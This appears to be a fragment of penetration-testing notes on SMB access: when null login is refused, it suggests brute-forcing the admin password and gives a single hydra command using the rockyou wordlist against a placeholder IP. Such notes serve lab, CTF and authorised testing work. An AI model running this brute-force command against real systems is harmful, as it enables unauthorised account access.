##### If the ***Null Login*** is not allowed we can try the password ***Brute Force***.
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://IP
```